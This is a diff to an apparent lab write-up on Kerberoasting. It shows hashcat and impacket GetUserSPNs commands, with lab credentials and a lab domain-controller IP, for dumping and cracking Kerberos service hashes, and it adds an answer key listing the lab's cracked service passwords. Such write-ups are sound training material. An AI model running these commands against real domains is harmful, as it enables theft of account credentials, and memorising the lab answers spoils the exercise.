@@ -593,20 +593,18 @@ controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.ex
 
 
 ```
-copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
+copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat (Make sure hash is on one line)
 : `hashcat -m 13100 -a 0 hash.txt Pass.txt`
 
 - `-m 13100` to set the mode
-- `-a 0`
+- `-a 0`     to set attack mode to basic
 - `hash.txt` path to hash file
 - `Pass.txt` path to password list, this lab provides a much shorter RockYou list, saved as Pass.txt
 
 
-2. 
 
 ### Method 2. Kerberoadsting with impacket
 
-Method 2 - Impacket
 
 **Impacket Installation**  
 
@@ -627,5 +625,16 @@ Kerberoasting w/ Impacket -
 2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.20.101 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
 
 3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
+
+### Questions
+
+1. What is the HTTPService Password?
+
+: Summer2020
+
+2. What is the SQLService Password?
+
+: MYPassword123#
+
 
 
